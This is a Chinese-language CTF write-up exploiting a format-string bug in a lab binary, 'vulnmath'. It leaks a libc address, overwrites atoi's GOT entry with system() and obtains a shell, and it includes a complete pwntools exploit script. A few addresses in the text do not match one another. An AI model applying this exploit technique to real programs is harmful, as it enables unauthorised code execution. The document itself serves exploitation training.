# 考察点

- fmtString 实现任意地址写



# 分析
题目给了 libc 文件
```shell
┌──(pitta㉿kali)-[~/workspace/pwn_learn/rec0rd/tu19_vulnmath]
└─$ ./vulnmath 
Welcome to VulnMath
Where your wildest shells can come true

What is 5 * 14?
> AAAA.%6$x   # 格式字符串 offset 为 6
Incorrect!
AAAA.41414141


pitta@ubuntu:~/workspace/pwn_learn/rec0rd/tu19_vulnmath$ file ./vulnmath 
./vulnmath: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ba48ed39bdaaa3ddfc1bab6e8f45c8ee92e552bc, for GNU/Linux 3.2.0, not stripped
pitta@ubuntu:~/workspace/pwn_learn/rec0rd/tu19_vulnmath$ checksec ./vulnmath
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/pitta/workspace/pwn_learn/rec0rd/tu19_vulnmath/vulnmath'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```



IDA
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int s[8]; // [esp+0h] [ebp-40h] BYREF
  int v6; // [esp+20h] [ebp-20h]
  int v7; // [esp+24h] [ebp-1Ch]
  int v8; // [esp+28h] [ebp-18h]
  void *buf; // [esp+2Ch] [ebp-14h]
  int i; // [esp+30h] [ebp-10h]
  int v11; // [esp+34h] [ebp-Ch]
  int *v12; // [esp+38h] [ebp-8h]

  v12 = &argc;
  setvbuf(stdout, 0, 2, 0x14u);
  setvbuf(stdin, 0, 2, 0x14u);
  v11 = 0;
  buf = malloc(0x40u);
  memset(s, 0, sizeof(s));
  v3 = time(0);
  srand(v3);
  puts("Welcome to VulnMath\nWhere your wildest shells can come true\n");
  for ( i = 0; i <= 5; ++i )
  {
    v8 = rand() % 19 + 1;
    v7 = rand() % 19 + 1;
    printf("What is %d * %d?\n> ", v8, v7);
    read(0, buf, 0x20u);                        // no overflow
    s[0] = *(_DWORD *)buf;                      // s is depended on buf
    s[1] = *((_DWORD *)buf + 1);
    s[2] = *((_DWORD *)buf + 2);
    s[3] = *((_DWORD *)buf + 3);
    s[4] = *((_DWORD *)buf + 4);
    s[5] = *((_DWORD *)buf + 5);
    s[6] = *((_DWORD *)buf + 6);
    s[7] = *((_DWORD *)buf + 7);
    v6 = atoi((const char *)s);     // overwrite Target
    if ( v6 == v7 * v8 )
    {
      puts("Correct! +5 points");
      v11 += 5;
    }
    else
    {
      puts("Incorrect!");
      printf((const char *)s);      // leak point
    }
    puts((const char *)&unk_804A077);
  }
  printf("Final Score: %d\n", v11);
  puts("Thanks for playing!");
  free(buf);
  return 0;
}
```

因为给了 libc ，因此可以尝试进行 libc Leak，计算出 system 地址，然后因为只开了`Partial RELRO`，给了对 GOT 写入的空间，本例对 atoiGOT 进行 overwrite，因为在 `main` 中的参数和 `userInput` 高度相关，把他修改为 `system`，在传入 `/bin/sh` 即可拿到shell
## leak libc
在 incorrect 分支的 printf 下段，gdb 查看栈布局
```shell
gef➤  x/30wx $esp
0xffffcfec:     0x08049494      0xffffd008      0x0804d160      0x00000020
0xffffcffc:     0x080493ba      0x0000000c      0xffffd262      0x41414141(*)
0xffffd00c:     0x0000000a      0x00000000      0x00000000      0x00000000
0xffffd01c:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd02c:     0x00000002      0x00000007      0x0804d160      0x00000000
0xffffd03c:     0x00000000      0xffffd060      0x00000000      0x00000000
0xffffd04c:     0xf7df8fa1(*)   0xf7fb5000      0xf7fb5000      0x00000000
0xffffd05c:     0xf7df8fa1      0x00000001
0xffffcdac:     0xf7c23c65      0x00000001
gef➤  vmmap 
[ Legend:  Code | Heap | Stack ]
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-- /home/pitta/workspace/pwn_learn/rec0rd/tu19_vulnmath/vulnmath
0x08049000 0x0804a000 0x00001000 r-x /home/pitta/workspace/pwn_learn/rec0rd/tu19_vulnmath/vulnmath
0x0804a000 0x0804b000 0x00002000 r-- /home/pitta/workspace/pwn_learn/rec0rd/tu19_vulnmath/vulnmath
0x0804b000 0x0804c000 0x00002000 r-- /home/pitta/workspace/pwn_learn/rec0rd/tu19_vulnmath/vulnmath
0x0804c000 0x0804d000 0x00003000 rw- /home/pitta/workspace/pwn_learn/rec0rd/tu19_vulnmath/vulnmath
0x0804d000 0x0806f000 0x00000000 rw- [heap]
0xf7de0000 0xf7fb2000 0x00000000 r-x /lib32/libc-2.27.so  (*)
0xf7fb2000 0xf7fb3000 0x001d2000 --- /lib32/libc-2.27.so
0xf7fb3000 0xf7fb5000 0x001d2000 r-- /lib32/libc-2.27.so
0xf7fb5000 0xf7fb6000 0x001d4000 rw- /lib32/libc-2.27.so
0xf7fb6000 0xf7fb9000 0x00000000 rw- 
0xf7fcf000 0xf7fd1000 0x00000000 rw- 
0xf7fd1000 0xf7fd4000 0x00000000 r-- [vvar]
0xf7fd4000 0xf7fd6000 0x00000000 r-x [vdso]
0xf7fd6000 0xf7ffc000 0x00000000 r-x /lib32/ld-2.27.so
0xf7ffc000 0xf7ffd000 0x00025000 r-- /lib32/ld-2.27.so
0xf7ffd000 0xf7ffe000 0x00026000 rw- /lib32/ld-2.27.so
0xfffdd000 0xffffe000 0x00000000 rw- [stack]
```
fmtString 的 offset=6 的位置是输入字符串的起始，偏移 23处的地址是 libc 的范围，vmmap 查看到的当前 gdb 环境的 libc 载入地址：0xf7de0000，因此这个地址的偏移是 0xf7df8fa1 - 0xf7c00000 = 0x18FA1

```shell
pitta@ubuntu:~/workspace/pwn_learn/rec0rd/tu19_vulnmath$ readelf -r ./vulnmath 

Relocation section '.rel.dyn' at offset 0x428 contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804bff4  00000706 R_386_GLOB_DAT    00000000   __gmon_start__
0804bff8  00000a06 R_386_GLOB_DAT    00000000   stdin@GLIBC_2.0
0804bffc  00000e06 R_386_GLOB_DAT    00000000   stdout@GLIBC_2.0

Relocation section '.rel.plt' at offset 0x440 contains 12 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804c00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
0804c010  00000207 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
0804c014  00000307 R_386_JUMP_SLOT   00000000   free@GLIBC_2.0
0804c018  00000407 R_386_JUMP_SLOT   00000000   time@GLIBC_2.0
0804c01c  00000507 R_386_JUMP_SLOT   00000000   malloc@GLIBC_2.0
0804c020  00000607 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
0804c024  00000807 R_386_JUMP_SLOT   00000000   srand@GLIBC_2.0
0804c028  00000907 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804c02c  00000b07 R_386_JUMP_SLOT   00000000   setvbuf@GLIBC_2.0
0804c030  00000c07 R_386_JUMP_SLOT   00000000   memset@GLIBC_2.0
0804c034  00000d07 R_386_JUMP_SLOT   00000000   rand@GLIBC_2.0
0804c038  00000f07 R_386_JUMP_SLOT   00000000   atoi@GLIBC_2.0    # atoi GOT 地址
```

构造 payload 将 0x0804c038 覆写为 system 地址【通过 libc database 查询得到偏移为：0x3cf10】因此，system 的地址为 libc 基址+0x3cf10
```python
print(pipe.recvuntil("> "))
payload2Leak = "%23$x"
pipe.sendline(payload2Leak)
print(pipe.recvline())
leakAddr = int(pipe.recvline(),16)
# print("Leak addr: 0x%x" % leakAddr)

libcBase = leakAddr - 0x18FA1
# print("libcBase address: 0x%x" % libcBase)

# calculate address of system   
sysAddr = libcBase + 0x3cf10    # offset is search by libc database
print("system call: 0x%x" % sysAddr)
```

payload 如下：
```python
atoiGOT = 0x0804c038
firstWrite = (sysAddr & 0xffff) - 0x8
secondWrite = ((sysAddr & 0xffff0000) >> 16)  - (sysAddr & 0xffff)
# print(str(firstWrite))
# print(str(secondWrite))
# pause()

payload = p32(0x0804c038)
payload += p32(0x0804c03a)
payload += "%" + str(firstWrite) + "c"
payload += "%6$hn"
payload += "%" + str(secondWrite) + "c"
payload += "%7$hn"
```

# exp

```python
from pwn import *
context.terminal = ['tmux', 'splitw', '-v']
context.log_level = "debug"
pipe = process("./vulnmath")

print(pipe.recvuntil("> "))
payload2Leak = "%23$x"
pipe.sendline(payload2Leak)
print(pipe.recvline())
leakAddr = int(pipe.recvline(),16)
# print("Leak addr: 0x%x" % leakAddr)

libcBase = leakAddr - 0x18FA1
# print("libcBase address: 0x%x" % libcBase)

# calculate address of system   
sysAddr = libcBase + 0x3cf10    # offset is search by libc database
print("system call: 0x%x" % sysAddr)


# overwrite atoi GOT
atoiGOT = 0x0804c038
firstWrite = (sysAddr & 0xffff) - 0x8
secondWrite = ((sysAddr & 0xffff0000) >> 16)  - (sysAddr & 0xffff)
payload = p32(0x0804c038)
payload += p32(0x0804c03a)
payload += "%" + str(firstWrite) + "c"
payload += "%6$hn"
payload += "%" + str(secondWrite) + "c"
payload += "%7$hn"

# log.info("before overwrite atoiGOT")
# pause()
pipe.sendline(payload)
# pause()

pipe.sendline("/bin/sh")
pipe.interactive()

```

# GDB 调试
```shell
What is 10 * 1?                                                                                           │   0xf7f59dfc <__kernel_vsyscall+000c> ret
>                                                                                                         │   0xf7f59dfd                  nop
[DEBUG] Sent 0x6 bytes:                                                                                   │   0xf7f59dfe                  nop
    '%23$x\n'                                                                                             
[DEBUG] Received 0x26 bytes:                                                                              │[#0] Id 1, Name: "vulnmath", stopped 0xf7f59df9 in __kernel_vsyscall (), reason: STOPPED
    'Incorrect!\n'                                                                                        
    'f7d7dfa1\n'                                                                                          │[#0] 0xf7f59df9 → __kernel_vsyscall()
    '\n'                                                                                                  │[#1] 0xf7e4a817 → write()
    'What is 8 * 7?\n'                                                                                    │[#2] 0xf7dd67eb → _IO_file_write()
    '> '                                                                                                  │[#3] 0xf7dd581a → mov ebp, eax
Incorrect!                                                                                                │[#4] 0xf7dd6ffd → _IO_file_xsputn()
                                                                                                          │[#5] 0xf7dab106 → mov ebp, eax
system call: 0xf7da1f10     # system 地址                                                                              │[#6] 0xf7dd8d56 → _IO_default_xsputn()
[*] before overwrite atoiGOT                                                                              │[#7] 0xf7dcbefa → _IO_padn()
[*] Paused (press any to continue)                                                                        │[#8] 0xf7dad258 → add esp, 0x10
[DEBUG] Sent 0x20 bytes:                                                                                  │[#9] 0xf7daf2bb → vfprintf()
    00000000  38 c0 04 08  3a c0 04 08  25 37 39 34  34 63 25 36  │8···│:···│%794│4c%6│                   
    00000010  24 68 6e 25  35 35 34 39  38 63 25 37  24 68 6e 0a  │$hn%│5549│8c%7│$hn·│                   │0xf7f59df9 in __kernel_vsyscall ()
    00000020                                                                                              │gef➤  x/wx 0x0804c038
[*] Paused (press any to continue)                                                                        │0x804c038:      0xf7d91f10 # 成功写为 system
                                                                                                          │gef➤  
```

